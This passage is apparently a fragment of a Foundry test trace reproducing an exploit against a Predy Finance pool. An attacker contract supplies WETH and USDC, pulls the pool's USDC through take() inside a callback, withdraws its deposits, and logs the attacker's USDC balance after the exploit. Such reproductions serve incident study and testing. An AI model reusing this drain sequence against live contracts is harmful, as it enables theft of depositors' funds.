    │   │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 83910994929830029848 [8.391e19]
    │   │   │   │   │   └─ ← [Return] 83910994929830029848 [8.391e19]
    │   │   │   │   ├─ [87373] PredyPool::supply(3, true, 83910994929830029848 [8.391e19])
    │   │   │   │   │   ├─ [86909] 0x7b8b944AB2f24C829504a7a6D70fce5298f2147c::supply(3, true, 83910994929830029848 [8.391e19]) [delegatecall]
    │   │   │   │   │   │   ├─ [78373] 0x5E8d28Bd2abE77e9D3e9DD8CCc1727EDa616ACE0::3ec463bf(000000000000000000000000000000000000000000000000000000000000003400000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000048c7fbd4f261f6a180000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
    │   │   │   │   │   │   │   ├─ [6880] WETH::transferFrom(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], 83910994929830029848 [8.391e19])
    │   │   │   │   │   │   │   │   ├─ [6128] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transferFrom(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], 83910994929830029848 [8.391e19]) [delegatecall]
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], value: 83910994929830029848 [8.391e19])
    │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], value: 115792089237316195423570985008687907853269984665640564039373673012983299610087 [1.157e77])
    │   │   │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   │   │   @ 0xe8d16bce44843424e5de4332ad956609f7bda010c07b6e7438ca015cfddbbfdf: 0 → 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18
    │   │   │   │   │   │   │   │   │   │   @ 0xb02242e57e19c64392abbe71b4cdd3bc58f69863ac42fb4f1976e015ccd1f7eb: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffb738042b0d9e095e7
    │   │   │   │   │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18 → 0
    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   ├─ [46736] 0x3Dd636919d4180B59d9225370CB84F1BA849aba2::mint(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 83910994929830029848 [8.391e19])
    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 83910994929830029848 [8.391e19])
    │   │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18
    │   │   │   │   │   │   │   │   │   @ 2: 0 → 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   ├─ emit TokenSupplied(param0: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 3, param2: true, param3: 83910994929830029848 [8.391e19])
    │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18
    │   │   │   │   │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c315a: 0 → 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18
    │   │   │   │   │   │   │   │   @ 0xb02242e57e19c64392abbe71b4cdd3bc58f69863ac42fb4f1976e015ccd1f7eb: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffb738042b0d9e095e7
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18
    │   │   │   │   │   │   └─ ← [Return] 83910994929830029848 [8.391e19]
    │   │   │   │   │   └─ ← [Return] 83910994929830029848 [8.391e19]
    │   │   │   │   ├─ [1250] USDC::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [staticcall]
    │   │   │   │   │   ├─ [553] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 219585737814 [2.195e11]
    │   │   │   │   │   └─ ← [Return] 219585737814 [2.195e11]
    │   │   │   │   ├─ [39777] PredyPool::take(false, PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 219585737814 [2.195e11])
    │   │   │   │   │   ├─ [39316] 0x7b8b944AB2f24C829504a7a6D70fce5298f2147c::take(false, PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 219585737814 [2.195e11]) [delegatecall]
    │   │   │   │   │   │   ├─ [28063] USDC::transfer(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 219585737814 [2.195e11])
    │   │   │   │   │   │   │   ├─ [27363] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::transfer(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 219585737814 [2.195e11]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], to: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 219585737814 [2.195e11])
    │   │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   │   @ 0xa03677c40c50525567e80795a48170e552bc5bbc523a90ccbbadb3441d0e2f33: 0x0000000000000000000000000000000000000000000000000000003320547456 → 0
    │   │   │   │   │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0 → 0x0000000000000000000000000000000000000000000000000000003320547456
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   ├─ [1250] USDC::balanceOf(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   ├─ [553] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::balanceOf(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 219585737814 [2.195e11]
    │   │   │   │   │   └─ ← [Return] 219585737814 [2.195e11]
    │   │   │   │   ├─ [82411] PredyPool::supply(3, false, 219585737814 [2.195e11])
    │   │   │   │   │   ├─ [81947] 0x7b8b944AB2f24C829504a7a6D70fce5298f2147c::supply(3, false, 219585737814 [2.195e11]) [delegatecall]
    │   │   │   │   │   │   ├─ [77911] 0x5E8d28Bd2abE77e9D3e9DD8CCc1727EDa616ACE0::3ec463bf(0000000000000000000000000000000000000000000000000000000000000034000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000033205474560000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   │   │   │   │   ├─ [6428] USDC::transferFrom(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], 219585737814 [2.195e11])
    │   │   │   │   │   │   │   │   ├─ [5754] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::transferFrom(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], 219585737814 [2.195e11]) [delegatecall]
    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], value: 219585737814 [2.195e11])
    │   │   │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0x0000000000000000000000000000000000000000000000000000003320547456 → 0
    │   │   │   │   │   │   │   │   │   │   @ 0xa03677c40c50525567e80795a48170e552bc5bbc523a90ccbbadb3441d0e2f33: 0 → 0x0000000000000000000000000000000000000000000000000000003320547456
    │   │   │   │   │   │   │   │   │   │   @ 0x2650628399afba46c0d5bc7111fbfc1f83cb3f80ebd920b9b4b03e4e4772e72a: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffccdfab8ba9
    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   ├─ [46736] 0x0b9F4DFb6eB2A8c2F26E98C4538422E6b8C4599F::mint(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 219585737814 [2.195e11])
    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 219585737814 [2.195e11])
    │   │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000000000003320547456
    │   │   │   │   │   │   │   │   │   @ 2: 0 → 0x0000000000000000000000000000000000000000000000000000003320547456
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   ├─ emit TokenSupplied(param0: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 3, param2: false, param3: 219585737814 [2.195e11])
    │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000000000003320547456
    │   │   │   │   │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3168: 0 → 0x0000000000000000000000000000000000000000000000000000003320547456
    │   │   │   │   │   │   │   │   @ 0x2650628399afba46c0d5bc7111fbfc1f83cb3f80ebd920b9b4b03e4e4772e72a: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffccdfab8ba9
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000003320547456
    │   │   │   │   │   │   └─ ← [Return] 219585737814 [2.195e11]
    │   │   │   │   │   └─ ← [Return] 219585737814 [2.195e11]
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0 → 0x0000000000000000000000000000000000000000000000000000003320547456
    │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0 → 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18
    │   │   │   │   │   @ 1: 2 → 1
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [1296] WETH::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [staticcall]
    │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 83910994929830029848 [8.391e19]
    │   │   │   │   └─ ← [Return] 83910994929830029848 [8.391e19]
    │   │   │   ├─ [1250] USDC::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [staticcall]
    │   │   │   │   ├─ [553] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 219585737814 [2.195e11]
    │   │   │   │   └─ ← [Return] 219585737814 [2.195e11]
    │   │   │   ├─  emit topic 0: 0xafecffdfc9906da328a7d048a7235b0a331352cf962e7cf39fd17f7b179c8114
    │   │   │   │        topic 1: 0x00000000000000000000000000000000000000000000000000000000000000b9
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [421] PredyFinance::getSqrtPrice() [staticcall]
    │   │   │   │   └─ ← [Return] 40000000000 [4e10]
    │   │   │   ├─  emit topic 0: 0xf732e00cf418a865e6ec6c29e41dfed06596a41a14775a0b8547302f5bbb54f1
    │   │   │   │        topic 1: 0x00000000000000000000000000000000000000000000000000000000000000b9
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 1: 2 → 1
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001474e81327fd11f2dc5e47998da28d3500000000000000000000000000000000000000000000000000000009502f9000000000000000000000000000000000000000485dd13b7f8e8eb26f0c9ba84363
    │   │   ├─  storage changes:
    │   │   │   @ 0xe40e4f92289c9123a4a1546a3c1a80bc2c52a1392bd4deacedd00c7e7ba2af58: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   @ 0xe40e4f92289c9123a4a1546a3c1a80bc2c52a1392bd4deacedd00c7e7ba2af5b: 0 → 3
    │   │   │   @ 0xe40e4f92289c9123a4a1546a3c1a80bc2c52a1392bd4deacedd00c7e7ba2af57: 0 → 0x00000000000000000000000082af49447d8a07e3bd95bd0d56f35241523fbab1
    │   │   │   @ 53: 185 → 186
    │   │   │   @ 0xe40e4f92289c9123a4a1546a3c1a80bc2c52a1392bd4deacedd00c7e7ba2af56: 0 → 185
    │   │   │   @ 0xe40e4f92289c9123a4a1546a3c1a80bc2c52a1392bd4deacedd00c7e7ba2af59: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   └─ ← [Return] TradeResult({ payoff: Payoff({ perpEntryUpdate: 0, sqrtEntryUpdate: 0, sqrtRebalanceEntryUpdateUnderlying: 0, sqrtRebalanceEntryUpdateStable: 0, perpPayoff: 0, sqrtPayoff: 0 }), vaultId: 185, fee: 0, minMargin: 0, averagePrice: 27191573388027350797162890363563838773 [2.719e37], sqrtTwap: 40000000000 [4e10], sqrtPrice: 1467766464872793135688797347398499 [1.467e33] })
    │   └─ ← [Return] TradeResult({ payoff: Payoff({ perpEntryUpdate: 0, sqrtEntryUpdate: 0, sqrtRebalanceEntryUpdateUnderlying: 0, sqrtRebalanceEntryUpdateStable: 0, perpPayoff: 0, sqrtPayoff: 0 }), vaultId: 185, fee: 0, minMargin: 0, averagePrice: 27191573388027350797162890363563838773 [2.719e37], sqrtTwap: 40000000000 [4e10], sqrtPrice: 1467766464872793135688797347398499 [1.467e33] })
    ├─ [1296] WETH::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [staticcall]
    │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [delegatecall]
    │   │   └─ ← [Return] 83910994929830029848 [8.391e19]
    │   └─ ← [Return] 83910994929830029848 [8.391e19]
    ├─ [41654] PredyPool::withdraw(3, true, 83910994929830029848 [8.391e19])
    │   ├─ [41187] 0x7b8b944AB2f24C829504a7a6D70fce5298f2147c::withdraw(3, true, 83910994929830029848 [8.391e19]) [delegatecall]
    │   │   ├─ [37044] 0x5E8d28Bd2abE77e9D3e9DD8CCc1727EDa616ACE0::3e16468d(000000000000000000000000000000000000000000000000000000000000003400000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000048c7fbd4f261f6a180000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
    │   │   │   ├─ [542] 0x3Dd636919d4180B59d9225370CB84F1BA849aba2::balanceOf(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 83910994929830029848 [8.391e19]
    │   │   │   ├─ [2913] 0x3Dd636919d4180B59d9225370CB84F1BA849aba2::burn(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 83910994929830029848 [8.391e19])
    │   │   │   │   ├─ emit Transfer(from: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 83910994929830029848 [8.391e19])
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18 → 0
    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18 → 0
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [26900] WETH::transfer(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 83910994929830029848 [8.391e19])
    │   │   │   │   ├─ [26154] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 83910994929830029848 [8.391e19]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], to: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 83910994929830029848 [8.391e19])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0xe8d16bce44843424e5de4332ad956609f7bda010c07b6e7438ca015cfddbbfdf: 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18 → 0
    │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0 → 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit TokenWithdrawn(param0: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 3, param2: true, param3: 83910994929830029848 [8.391e19])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0 → 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c315a: 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18 → 0
    │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a18 → 0
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000048c7fbd4f261f6a180000000000000000000000000000000000000000000000048c7fbd4f261f6a18
    │   │   └─ ← [Return] 83910994929830029848 [8.391e19], 83910994929830029848 [8.391e19]
    │   └─ ← [Return] 83910994929830029848 [8.391e19], 83910994929830029848 [8.391e19]
    ├─ [1250] USDC::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [staticcall]
    │   ├─ [553] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::balanceOf(PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613]) [delegatecall]
    │   │   └─ ← [Return] 219585737814 [2.195e11]
    │   └─ ← [Return] 219585737814 [2.195e11]
    ├─ [42807] PredyPool::withdraw(3, false, 219585737814 [2.195e11])
    │   ├─ [42340] 0x7b8b944AB2f24C829504a7a6D70fce5298f2147c::withdraw(3, false, 219585737814 [2.195e11]) [delegatecall]
    │   │   ├─ [38197] 0x5E8d28Bd2abE77e9D3e9DD8CCc1727EDa616ACE0::3e16468d(0000000000000000000000000000000000000000000000000000000000000034000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000033205474560000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   ├─ [542] 0x0b9F4DFb6eB2A8c2F26E98C4538422E6b8C4599F::balanceOf(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 219585737814 [2.195e11]
    │   │   │   ├─ [2913] 0x0b9F4DFb6eB2A8c2F26E98C4538422E6b8C4599F::burn(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 219585737814 [2.195e11])
    │   │   │   │   ├─ emit Transfer(from: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 219585737814 [2.195e11])
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000000000000003320547456 → 0
    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000000000003320547456 → 0
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [28063] USDC::transfer(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 219585737814 [2.195e11])
    │   │   │   │   ├─ [27363] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::transfer(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 219585737814 [2.195e11]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: PredyPool: [0x9215748657319B17fecb2b5D086A3147BFBC8613], to: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 219585737814 [2.195e11])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0xa03677c40c50525567e80795a48170e552bc5bbc523a90ccbbadb3441d0e2f33: 0x0000000000000000000000000000000000000000000000000000003320547456 → 0
    │   │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0 → 0x0000000000000000000000000000000000000000000000000000003320547456
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit TokenWithdrawn(param0: PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 3, param2: false, param3: 219585737814 [2.195e11])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0x81d0999fde243adcc41b7fa1be5cea14f789e3a6065b815ac58f4bc0838c3168: 0x0000000000000000000000000000000000000000000000000000003320547456 → 0
    │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000000000000003320547456 → 0
    │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0 → 0x0000000000000000000000000000000000000000000000000000003320547456
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000033205474560000000000000000000000000000000000000000000000000000003320547456
    │   │   └─ ← [Return] 219585737814 [2.195e11], 219585737814 [2.195e11]
    │   └─ ← [Return] 219585737814 [2.195e11], 219585737814 [2.195e11]
    ├─ [1781] USDC::symbol() [staticcall]
    │   ├─ [1081] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::symbol() [delegatecall]
    │   │   └─ ← [Return] "USDC"
    │   └─ ← [Return] "USDC"
    ├─ [1250] USDC::balanceOf(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [553] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::balanceOf(PredyFinance: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 219585737814 [2.195e11]
    │   └─ ← [Return] 219585737814 [2.195e11]
    ├─ [1043] USDC::decimals() [staticcall]
    │   ├─ [381] 0x86E721b43d4ECFa71119Dd38c0f938A75Fdb57B3::decimals() [delegatecall]
    │   │   └─ ← [Return] 6
    │   └─ ← [Return] 6
    ├─ emit log_named_decimal_uint(key: "Attacker USDC Balance After exploit", val: 219585737814 [2.195e11], decimals: 6)
    ├─  storage changes:
    │   @ 1: 2 → 1
    │   @ 0xb02242e57e19c64392abbe71b4cdd3bc58f69863ac42fb4f1976e015ccd1f7eb: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   @ 52: 3 → 4
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 44.55s (43.02s CPU time)

Ran 2 test suites in 45.60s (45.01s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
